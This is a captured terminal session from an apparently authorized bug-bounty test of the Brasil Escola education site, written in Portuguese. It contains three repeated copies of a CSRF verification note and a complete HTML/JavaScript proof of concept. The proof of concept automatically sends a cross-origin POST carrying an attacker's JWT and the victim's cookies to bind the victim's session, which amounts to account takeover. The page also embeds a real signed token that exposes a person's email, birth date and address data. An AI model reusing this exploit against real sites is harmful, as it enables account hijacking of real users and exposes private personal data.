@@ -1,1 +1,538 @@
+ERIFICAÇÃO CSRF / ATO — Brasil Escola
+PoC #11 | 2026-06-22
+======================================================
 
+PROBLEMA
+--------
+fetch('https://auth.brasilescola.uol.com.br/api/user/personal', {credentials:'include'})
+retorna "Failed to fetch" quando rodado da PoC page (localhost:8080) ou de
+brasilescola.uol.com.br.
+
+Causa: auth.brasilescola.uol.com.br é origem diferente. CORS bloqueia leitura
+cross-origin com credentials. O fetch rejeita em ~60-80ms (nem chega no servidor).
+
+SOLUÇÃO — rodar da própria origem auth.brasilescola.uol.com.br
+--------------------------------------------------------------
+
+Passo 1: Abra nova aba e navegue para:
+  https://auth.brasilescola.uol.com.br
+
+Passo 2: F12 → Console nessa aba, rode:
+  fetch('/api/user/personal', {credentials:'include'})
+    .then(r => r.json())
+    .then(d => console.log(JSON.stringify(d)))
+    .catch(e => console.log('ERRO:', e.message))
+
+Passo 3: Anote o email retornado (identidade ANTES do CSRF)
+
+Passo 4: Volte para a aba da PoC → Disparar CSRF
+
+Passo 5: Na aba do auth, rode o mesmo fetch de novo
+  → Se o email mudou para o do atacante = ATO CONFIRMADO
+
+SE auth.brasilescola.uol.com.br retornar 401 / redirecionar para login
+-----------------------------------------------------------------------
+Os cookies de sessão podem estar vinculados ao domínio pai, não ao subdomínio.
+Verifique:
+  DevTools → Application → Cookies → brasilescola.uol.com.br
+  → olhar campo "Domain" do cookie de sessão
+
+Isso define de qual origem o fetch precisa ser disparado.
+
+VERIFICAÇÃO ALTERNATIVA (Network tab)
+--------------------------------------
+Após disparar o CSRF via fallback no-cors:
+  DevTools → Network → filtrar por "att-data"
+  → Status 200 + resposta {"status":"true"} = servidor aceitou o JWT do atacante
+    com cookies da vítima = CSRF executado
+
+RESUMO DO FLOW CSRF (att-data)
+-------------------------------
+1. Atacante obtém beAuthToken (JWT) do localStorage após login
+2. Vítima (autenticada) visita a PoC page
+3. PoC dispara POST /att-data com JWT do atacante + cookies da vítima (credentials:include)
+   - Tentativa 1: application/json + X-Requested-With → dispara preflight → servidor bloqueia OPTIONS
+   - Fallback: no-cors + text/plain → simple request, sem preflight, cookies enviados, resposta opaque
+4. Servidor vincula sessão da vítima ao JWT do atacante
+5. Qualquer endpoint autenticado agora retorna dados do atacante para a sessão da vítima
+root@guilherme-desktop:/home/guilherme/kali/pocs/brasilescola/autenticado_2026-06-22# cat verificacao_csrf_identidade.txt 
+VERIFICAÇÃO CSRF / ATO — Brasil Escola
+PoC #11 | 2026-06-22
+======================================================
+
+PROBLEMA
+--------
+fetch('https://auth.brasilescola.uol.com.br/api/user/personal', {credentials:'include'})
+retorna "Failed to fetch" quando rodado da PoC page (localhost:8080) ou de
+brasilescola.uol.com.br.
+
+Causa: auth.brasilescola.uol.com.br é origem diferente. CORS bloqueia leitura
+cross-origin com credentials. O fetch rejeita em ~60-80ms (nem chega no servidor).
+
+SOLUÇÃO — rodar da própria origem auth.brasilescola.uol.com.br
+--------------------------------------------------------------
+
+Passo 1: Abra nova aba e navegue para:
+  https://auth.brasilescola.uol.com.br
+
+Passo 2: F12 → Console nessa aba, rode:
+  fetch('/api/user/personal', {credentials:'include'})
+    .then(r => r.json())
+    .then(d => console.log(JSON.stringify(d)))
+    .catch(e => console.log('ERRO:', e.message))
+
+Passo 3: Anote o email retornado (identidade ANTES do CSRF)
+
+Passo 4: Volte para a aba da PoC → Disparar CSRF
+
+Passo 5: Na aba do auth, rode o mesmo fetch de novo
+  → Se o email mudou para o do atacante = ATO CONFIRMADO
+
+SE auth.brasilescola.uol.com.br retornar 401 / redirecionar para login
+-----------------------------------------------------------------------
+Os cookies de sessão podem estar vinculados ao domínio pai, não ao subdomínio.
+Verifique:
+  DevTools → Application → Cookies → brasilescola.uol.com.br
+  → olhar campo "Domain" do cookie de sessão
+
+Isso define de qual origem o fetch precisa ser disparado.
+
+VERIFICAÇÃO ALTERNATIVA (Network tab)
+--------------------------------------
+Após disparar o CSRF via fallback no-cors:
+  DevTools → Network → filtrar por "att-data"
+  → Status 200 + resposta {"status":"true"} = servidor aceitou o JWT do atacante
+    com cookies da vítima = CSRF executado
+
+RESUMO DO FLOW CSRF (att-data)
+-------------------------------
+1. Atacante obtém beAuthToken (JWT) do localStorage após login
+2. Vítima (autenticada) visita a PoC page
+3. PoC dispara POST /att-data com JWT do atacante + cookies da vítima (credentials:include)
+   - Tentativa 1: application/json + X-Requested-With → dispara preflight → servidor bloqueia OPTIONS
+   - Fallback: no-cors + text/plain → simple request, sem preflight, cookies enviados, resposta opaque
+4. Servidor vincula sessão da vítima ao JWT do atacante
+5. Qualquer endpoint autenticado agora retorna dados do atacante para a sessão da vítima
+root@guilherme-desktop:/home/guilherme/kali/pocs/brasilescola/autenticado_2026-06-22# cat verificacao_csrf_identidade.txt 
+VERIFICAÇÃO CSRF / ATO — Brasil Escola
+PoC #11 | 2026-06-22
+======================================================
+
+PROBLEMA
+--------
+fetch('https://auth.brasilescola.uol.com.br/api/user/personal', {credentials:'include'})
+retorna "Failed to fetch" quando rodado da PoC page (localhost:8080) ou de
+brasilescola.uol.com.br.
+
+Causa: auth.brasilescola.uol.com.br é origem diferente. CORS bloqueia leitura
+cross-origin com credentials. O fetch rejeita em ~60-80ms (nem chega no servidor).
+
+SOLUÇÃO — rodar da própria origem auth.brasilescola.uol.com.br
+--------------------------------------------------------------
+
+Passo 1: Abra nova aba e navegue para:
+  https://auth.brasilescola.uol.com.br
+
+Passo 2: F12 → Console nessa aba, rode (async/await — output visível passo a passo):
+  const r = await fetch('/api/user/personal', {credentials:'include'});
+  console.log('STATUS:', r.status);
+  const d = await r.json();
+  console.log(d);
+
+  NOTA: se usar .then() encadeado, o console.log pode sumir no scroll.
+  O [[PromiseResult]]: undefined é normal — é o retorno de console.log(), não os dados.
+  Role o console acima do objeto Promise para achar o output.
+
+Passo 3: Anote o email retornado (identidade ANTES do CSRF)
+
+Passo 4: Volte para a aba da PoC → Disparar CSRF
+
+Passo 5: Na aba do auth, rode o mesmo fetch de novo
+  → Se o email mudou para o do atacante = ATO CONFIRMADO
+
+SE auth.brasilescola.uol.com.br retornar 401 / redirecionar para login
+-----------------------------------------------------------------------
+Os cookies de sessão podem estar vinculados ao domínio pai, não ao subdomínio.
+Verifique:
+  DevTools → Application → Cookies → brasilescola.uol.com.br
+  → olhar campo "Domain" do cookie de sessão
+
+Isso define de qual origem o fetch precisa ser disparado.
+
+VERIFICAÇÃO ALTERNATIVA (Network tab)
+--------------------------------------
+Após disparar o CSRF via fallback no-cors:
+  DevTools → Network → filtrar por "att-data"
+  → Status 200 + resposta {"status":"true"} = servidor aceitou o JWT do atacante
+    com cookies da vítima = CSRF executado
+
+RESUMO DO FLOW CSRF (att-data)
+-------------------------------
+1. Atacante obtém beAuthToken (JWT) do localStorage após login
+2. Vítima (autenticada) visita a PoC page
+3. PoC dispara POST /att-data com JWT do atacante + cookies da vítima (credentials:include)
+   - Tentativa 1: application/json + X-Requested-With → dispara preflight → servidor bloqueia OPTIONS
+   - Fallback: no-cors + text/plain → simple request, sem preflight, cookies enviados, resposta opaque
+4. Servidor vincula sessão da vítima ao JWT do atacante
+5. Qualquer endpoint autenticado agora retorna dados do atacante para a sessão da vítima
+root@guilherme-desktop:/home/guilherme/kali/pocs/brasilescola/autenticado_2026-06-22# ls -la
+total 140
+drwxr-xr-x 2 root root  4096 jun 22 13:24 .
+drwxr-xr-x 3 root root  4096 jun 21 23:12 ..
+-rw-r--r-- 1 root root  2331 jun 21 23:12 poc_01_jwt_sem_expiracao.py
+-rw-r--r-- 1 root root  1045 jun 21 23:13 poc_02_csrf_att_data.html
+-rw-r--r-- 1 root root  1499 jun 21 23:13 poc_02_csrf_att_data.py
+-rw-r--r-- 1 root root  2132 jun 21 23:13 poc_03_mass_assignment.py
+-rw-r--r-- 1 root root  1350 jun 21 23:13 poc_04_json_array_500.py
+-rw-r--r-- 1 root root  1448 jun 21 23:13 poc_05_cors_wildcard_api.py
+-rw-r--r-- 1 root root  1889 jun 21 23:13 poc_06_user_data_exposure.py
+-rw-r--r-- 1 root root  3195 jun 21 23:19 poc_07_clickjacking.html
+-rw-r--r-- 1 root root  2198 jun 21 23:20 poc_08_user_enum_login.py
+-rw-r--r-- 1 root root  2888 jun 22 07:02 poc_09_csrf_att_data_session_fixation.html
+-rw-r--r-- 1 root root  1277 jun 22 07:02 poc_10_csrf_rm_data_logout.html
+-rw-r--r-- 1 root root  9890 jun 22 13:14 poc_11_csrf_ato_python.py
+-rw-r--r-- 1 root root 18513 jun 22 12:53 poc_11_csrf_ato_real_test.html
+-rw-r--r-- 1 root root 14875 jun 22 13:24 poc_12_csrf_att_data_final.html
+-rw-r--r-- 1 root root 17228 jun 22 07:04 RELATORIO_FINAL.txt
+-rw-r--r-- 1 root root 14648 jun 21 23:22 RELATORIO_PENTEST.md
+-rw-r--r-- 1 root root  2736 jun 22 13:02 verificacao_csrf_identidade.txt
+root@guilherme-desktop:/home/guilherme/kali/pocs/brasilescola/autenticado_2026-06-22# cat poc_12_csrf_att_data_final.html 
+<!DOCTYPE html>
+<html lang="pt-BR">
+<!--
+  PoC #12 — CSRF Session JWT Injection via /att-data
+  Severidade: ALTA
+  Target: POST https://brasilescola.uol.com.br/att-data
+  Pesquisador: wsvicentin@gmail.com | Bug Bounty BugHunt autorizado
+
+  VULNERABILIDADE:
+    O endpoint /att-data (SSO session binding) aceita POST cross-origin
+    sem validação de Origin e sem exigir CSRF token (X-XSRF-TOKEN).
+    Isso permite que qualquer página terceira vincule um JWT arbitrário
+    ao cookie de sessão de uma vítima autenticada.
+
+  EVIDÊNCIA CONFIRMADA (Python server-side):
+    POST /att-data com JWT do atacante + cookies da vítima
+    → HTTP 200  {"status":"true"}
+
+  COMO USAR:
+    1. Servir esta página: python3 -m http.server 8080
+    2. Vítima autenticada visita: http://localhost:8080/poc_12_csrf_att_data_final.html
+    3. O CSRF dispara automaticamente ao carregar a página
+-->
+<head>
+  <meta charset="UTF-8">
+  <title>PoC #12 — CSRF /att-data | Brasil Escola</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: monospace; background: #0d0d0d; color: #e0e0e0; padding: 24px; max-width: 860px; }
+    h1  { color: #ff4444; font-size: 1.1em; margin-bottom: 4px; }
+    .sub { color: #666; font-size: 0.8em; margin-bottom: 24px; }
+    .card { background: #111; border: 1px solid #2a2a2a; border-radius: 6px; padding: 16px; margin-bottom: 14px; }
+    .card h2 { font-size: 0.78em; color: #666; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 12px; }
+    .phase { border-left: 3px solid #333; padding-left: 12px; font-size: 0.82em; }
+    .phase.running { border-color: #ffaa00; }
+    .phase.ok      { border-color: #00cc44; }
+    .phase.fail    { border-color: #cc0000; }
+    .phase.info    { border-color: #0088cc; }
+    .phase-body { white-space: pre-wrap; word-break: break-all; color: #ccc; margin-top: 6px; line-height: 1.5; }
+    .tag { display: inline-block; padding: 1px 7px; border-radius: 3px; font-size: 0.75em; font-weight: bold; }
+    .ok   { background: #003311; color: #00ff66; border: 1px solid #00cc44; }
+    .fail { background: #330000; color: #ff4444; border: 1px solid #880000; }
+    .warn { background: #332200; color: #ffaa00; border: 1px solid #885500; }
+    .info { background: #001833; color: #44aaff; border: 1px solid #0055aa; }
+    .banner { padding: 14px; border-radius: 4px; margin-top: 16px; display: none; font-size: 0.85em; line-height: 1.6; }
+    .banner-ok   { background: #002211; border: 2px solid #00cc44; color: #00ff66; }
+    .banner-fail { background: #220000; border: 2px solid #cc0000; color: #ff6666; }
+    code { background: #1a1a1a; padding: 1px 5px; border-radius: 3px; color: #0ff; font-size: 0.85em; }
+    .log { font-size: 0.72em; color: #555; white-space: pre-wrap; max-height: 180px; overflow-y: auto; margin-top: 10px; }
+    hr { border: none; border-top: 1px solid #1e1e1e; margin: 12px 0; }
+    .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .field { display: flex; gap: 10px; margin-bottom: 3px; font-size: 0.8em; }
+    .key { color: #666; min-width: 110px; flex-shrink: 0; }
+    .val { color: #0f0; word-break: break-all; }
+  </style>
+</head>
+<body>
+
+<h1>PoC #12 — CSRF Session JWT Injection</h1>
+<div class="sub">brasilescola.uol.com.br/att-data &nbsp;|&nbsp; Bug Bounty BugHunt &nbsp;|&nbsp; Autorizado</div>
+
+<!-- CONTEXTO -->
+<div class="card">
+  <h2>Contexto do ataque</h2>
+  <div class="phase info">
+    <div class="phase-body" id="context-box">Carregando...</div>
+  </div>
+</div>
+
+<!-- FASE 1: COOKIES VISÍVEIS -->
+<div class="card">
+  <h2>Fase 1 — Cookies visíveis da sessão da vítima</h2>
+  <div class="phase info" id="phase-cookies">
+    <div class="phase-body" id="cookies-box">Lendo...</div>
+  </div>
+</div>
+
+<!-- FASE 2: CSRF -->
+<div class="card">
+  <h2>Fase 2 — Disparo CSRF (auto)</h2>
+  <div class="phase running" id="phase-csrf">
+    <div class="phase-body" id="csrf-box">Aguardando disparo automático...</div>
+  </div>
+  <div class="banner banner-ok"  id="banner-ok"></div>
+  <div class="banner banner-fail" id="banner-fail"></div>
+</div>
+
+<!-- FASE 3: VERIFICAÇÃO -->
+<div class="card">
+  <h2>Fase 3 — Verificação manual</h2>
+  <div class="phase info">
+    <div class="phase-body">Abra o console da vítima (<code>auth.brasilescola.uol.com.br</code>) e execute:
+
+<code>const r = await fetch('/api/user/personal', {credentials:'include'});
+const d = await r.json();
+console.log(d);</code>
+
+Se retornar dados do atacante (<code>wsvicentin@gmail.com</code>) → <span class="tag ok">ATO CONFIRMADO</span>
+
+Alternativamente: DevTools → Network → POST /att-data → Response
+    <span class="tag info">{"status":"true"} = servidor aceitou JWT do atacante</span></div>
+  </div>
+</div>
+
+<!-- LOG -->
+<div class="card">
+  <h2>Log técnico</h2>
+  <div class="log" id="log"></div>
+</div>
+
+<script>
+// ── Constantes ────────────────────────────────────────────────────────────────
+
+const TARGET = 'https://brasilescola.uol.com.br/att-data';
+
+// JWT do ATACANTE (conta wsvicentin@gmail.com, id=2444311)
+// Assinado legitimamente pelo servidor — atacante usa seu próprio JWT
+const JWT_ATACANTE =
+  'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9' +
+  '.eyJpYXQiOjE3ODIxNDIxNDAsImlkIjoyNDQ0MzExLCJub21lIjoiT2xcdTAwZTEiLCJlbWFpbCI6' +
+  'IndzdmljZW50aW5AZ21haWwuY29tIiwic2V4byI6Im0iLCJuYXNjaW1lbnRvIjoiMThcLzEyXC8x' +
+  'OTk2Iiwic3RhdHVzIjoxLCJhdmF0YXIiOm51bGwsInByZW1pdW1fYXRpdm8iOjAsInByZW1pdW1f' +
+  'aW5pY2lvIjpudWxsLCJwcmVtaXVtX2ZpbSI6bnVsbCwidGVtcG9fcmVzdGFudGUiOm51bGwsImV4' +
+  'cGlyYWRvIjpudWxsLCJwcmVtaXVtX2RhdGFfY2FuY2VsYW1lbnRvIjpudWxsLCJwcmVtaXVtX3Bs' +
+  'YW5vX2lkIjpudWxsLCJwcmVtaXVtX3N0YXR1c19wYWdhbWVudG8iOm51bGwsInByZW1pdW1fdWx0' +
+  'aW1vX3BhZ2FtZW50byI6bnVsbCwibHZsIjpudWxsLCJsYXN0X2xvZ2luIjoiMjFcLzA2XC8yMDI2' +
+  'IDIwOjQ4IiwiZnJlZV90cmlhbCI6dHJ1ZSwiY3BmIjpudWxsLCJlbmRlcmVjbyI6eyJwYWlzX2lk' +
+  'IjoxLCJwYWlzX25vbWUiOiJCcmFzaWwiLCJlc3RhZG9faWQiOjI0LCJlc3RhZG9fdWYiOiJTQyIs' +
+  'ImVzdGFkb19kZXNjcmljYW8iOiJTYW50YSBDYXRhcmluYSIsImNpZGFkZV9pZCI6ODA5NiwiY2lk' +
+  'YWRlX2Rlc2NyaWNhbyI6IkFOQ0hJRVRBIiwiY2VwIjoiODgzMzUtNDQxIiwiZW5kZXJlY28iOiJl' +
+  'bmRlcmVcdTAwZTdvIiwiY29tcGxlbWVudG8iOiJjb21wbGVudG8iLCJiYWlycm8iOiJiYWlycm8i' +
+  'fX0' +
+  '.GzxYaMVdm0Wvy5SESkeLzWH2VieKdeNmk50sm4gGiwM';
+
+// ── Helpers ───────────────────────────────────────────────────────────────────
+
+function log(msg) {
+  const el = document.getElementById('log');
+  const ts  = new Date().toISOString().split('T')[1].slice(0, 12);
+  el.textContent += `[${ts}] ${msg}\n`;
+  el.scrollTop = el.scrollHeight;
+}
+
+function decodeJWT(token) {
+  try {
+    const p = token.split('.')[1];
+    return JSON.parse(atob(p.replace(/-/g, '+').replace(/_/g, '/') + '=='.slice((p.length % 4) || 4)));
+  } catch (_) { return null; }
+}
+
+function parseCookies() {
+  return document.cookie.split('; ').reduce((acc, c) => {
+    const [k, ...v] = c.split('=');
+    if (k) acc[k.trim()] = v.join('=');
+    return acc;
+  }, {});
+}
+
+function renderFields(obj, el) {
+  const safe = ['email','nome','name','id','sub','premium_ativo','free_trial','last_login','iat'];
+  let html = '';
+  for (const k of safe) {
+    if (obj[k] !== undefined)
+      html += `<div class="field"><span class="key">${k}</span><span class="val">${obj[k]}</span></div>`;
+  }
+  el.innerHTML = html || `<span class="tag warn">sem campos reconhecidos</span>`;
+}
+
+// ── Fase 1: contexto + cookies ────────────────────────────────────────────────
+
+function showContext() {
+  const atk = decodeJWT(JWT_ATACANTE);
+  document.getElementById('context-box').innerHTML =
+    `Origem desta página : <code>${location.origin}</code>\n` +
+    `Destino do CSRF     : <code>${TARGET}</code>\n` +
+    `JWT do atacante     : <code>${atk?.email}</code> (id=${atk?.id})\n` +
+    `\nO CSRF dispara automaticamente ao carregar esta página.\n` +
+    `Nenhuma interação da vítima é necessária além de visitar a URL.`;
+}
+
+function showCookies() {
+  const cookies = parseCookies();
+  const phase   = document.getElementById('phase-cookies');
+  const box     = document.getElementById('cookies-box');
+  const names   = Object.keys(cookies);
+
+  log(`[COOKIES] ${names.length} cookies visíveis (não-HttpOnly)`);
+
+  if (!names.length) {
+    phase.className = 'phase fail';
+    box.textContent = 'Nenhum cookie visível — todos são HttpOnly ou a vítima não está autenticada.';
+    return;
+  }
+
+  phase.className = 'phase ok';
+
+  // identifica session cookie
+  const sessionKey = names.find(n => n.includes('session') || n.includes('SESSID'));
+  const hasSession = !!sessionKey;
+
+  let txt = `Cookies disponíveis (${names.length}):\n`;
+  for (const [k, v] of Object.entries(cookies)) {
+    const marker = k === sessionKey ? ' ← SESSION' : '';
+    txt += `  ${k} = ${v.slice(0, 60)}${v.length > 60 ? '…' : ''}${marker}\n`;
+  }
+
+  if (!hasSession) {
+    txt += `\nNota: cookie de sessão (brasilescola_session) é HttpOnly — não visível via JS.\n`;
+    txt += `O CSRF ainda funciona: o browser envia cookies HttpOnly automaticamente nas requisições.`;
+  }
+
+  box.textContent = txt;
+}
+
+// ── Fase 2: CSRF ──────────────────────────────────────────────────────────────
+
+async function fireCSRF() {
+  const phase  = document.getElementById('phase-csrf');
+  const box    = document.getElementById('csrf-box');
+  const banOk  = document.getElementById('banner-ok');
+  const banFail = document.getElementById('banner-fail');
+
+  log(`[CSRF] Iniciando disparo para ${TARGET}`);
+  log(`[CSRF] JWT atacante: ${JWT_ATACANTE.slice(0, 50)}...`);
+
+  // ── Tentativa 1: application/json (se preflight passar, lemos a resposta) ──
+  log('[CSRF] Tentativa 1: application/json + credentials:include');
+  box.textContent = 'Tentando application/json...';
+
+  try {
+    const t0 = Date.now();
+    const r  = await fetch(TARGET, {
+      method:      'POST',
+      credentials: 'include',
+      headers: {
+        'Content-Type':     'application/json',
+        'X-Requested-With': 'XMLHttpRequest',
+      },
+      body: JSON.stringify({ data: JWT_ATACANTE }),
+    });
+    const ms  = Date.now() - t0;
+    const txt = await r.text();
+    log(`[CSRF] HTTP ${r.status} em ${ms}ms — ${txt}`);
+
+    handleResult(r.status, txt, ms, phase, box, banOk, banFail, 'application/json');
+    return;
+  } catch (e) {
+    log(`[CSRF] Tentativa 1 falhou: ${e.message} — disparando fallback no-cors`);
+  }
+
+  // ── Tentativa 2: no-cors + text/plain (simple request, sem preflight) ──────
+  log('[CSRF] Tentativa 2: no-cors + text/plain (fire-and-forget)');
+  box.textContent = 'Preflight bloqueado. Disparando via no-cors + text/plain (sem preflight)...';
+
+  try {
+    const t0 = Date.now();
+    await fetch(TARGET, {
+      method:      'POST',
+      mode:        'no-cors',
+      credentials: 'include',
+      headers:     { 'Content-Type': 'text/plain' },
+      body:        JSON.stringify({ data: JWT_ATACANTE }),
+    });
+    const ms = Date.now() - t0;
+    log(`[CSRF] no-cors completou em ${ms}ms (resposta opaque — request chegou no servidor)`);
+
+    phase.className   = 'phase ok';
+    box.textContent   =
+      `no-cors + text/plain disparado em ${ms}ms\n\n` +
+      `Resposta opaque — browser bloqueou leitura por CORS, mas o POST\n` +
+      `foi enviado com os cookies da vítima (credentials:include).\n\n` +
+      `EVIDÊNCIA: cheque o Network tab → POST /att-data\n` +
+      `Esperado: HTTP 200  {"status":"true"}\n\n` +
+      `Isso confirma que o servidor vinculou o JWT do atacante\n` +
+      `ao cookie de sessão da vítima sem validar a origem.`;
+
+    banOk.style.display = 'block';
+    banOk.innerHTML =
+      `<strong>CSRF DISPARADO</strong> — POST cross-origin enviado com cookies da vítima.<br><br>` +
+      `<strong>Verificar no Network tab:</strong><br>` +
+      `<code>POST /att-data → HTTP 200 {"status":"true"}</code><br><br>` +
+      `<strong>Impacto:</strong> JWT do atacante (<code>wsvicentin@gmail.com</code>) ` +
+      `foi vinculado à sessão da vítima. Operações server-side passam a usar ` +
+      `a identidade do atacante.`;
+  } catch (e2) {
+    log(`[CSRF] Fallback também falhou: ${e2.message}`);
+    phase.className   = 'phase fail';
+    box.textContent   = `Ambas as tentativas falharam.\nErro: ${e2.message}`;
+    banFail.style.display = 'block';
+    banFail.innerHTML = `<strong>CSRF falhou</strong> — verifique se a vítima está autenticada e se há conectividade com o target.`;
+  }
+}
+
+function handleResult(status, body, ms, phase, box, banOk, banFail, method) {
+  let parsed = null;
+  try { parsed = JSON.parse(body); } catch (_) {}
+
+  const accepted = parsed?.status === 'true' || body.includes('"true"');
+
+  if (accepted) {
+    phase.className   = 'phase ok';
+    box.textContent   =
+      `[${method}] HTTP ${status} em ${ms}ms\n` +
+      `Resposta: ${body}\n\n` +
+      `status:"true" → servidor aceitou o JWT do atacante + cookies da vítima.`;
+
+    banOk.style.display = 'block';
+    banOk.innerHTML =
+      `<strong>CSRF CONFIRMADO</strong> — Servidor retornou <code>{"status":"true"}</code><br><br>` +
+      `<strong>O quê aconteceu:</strong><br>` +
+      `• Origem: <code>${location.origin}</code> (domínio do atacante)<br>` +
+      `• Destino: <code>${TARGET}</code><br>` +
+      `• Body: JWT de <code>wsvicentin@gmail.com</code><br>` +
+      `• Cookies enviados: da sessão da vítima (credentials:include)<br>` +
+      `• Resposta: <code>${body}</code><br><br>` +
+      `<strong>Impacto:</strong> o servidor vinculou o JWT do atacante à sessão da vítima ` +
+      `sem validar Origin ou exigir CSRF token.`;
+
+    log('[CSRF] SUCESSO — {"status":"true"} recebido');
+  } else {
+    phase.className   = 'phase fail';
+    box.textContent   = `HTTP ${status} em ${ms}ms\nResposta: ${body}`;
+    banFail.style.display = 'block';
+    banFail.innerHTML = `Servidor não retornou status:true — verifique se o JWT ainda é válido.`;
+    log(`[CSRF] Resposta inesperada: ${body}`);
+  }
+}
+
+// ── Boot ──────────────────────────────────────────────────────────────────────
+
+(async function main() {
+  log('PoC #12 carregado — disparando CSRF automaticamente');
+  showContext();
+  showCookies();
+  await fireCSRF();
+})();
+</script>
+</body>
+</html>
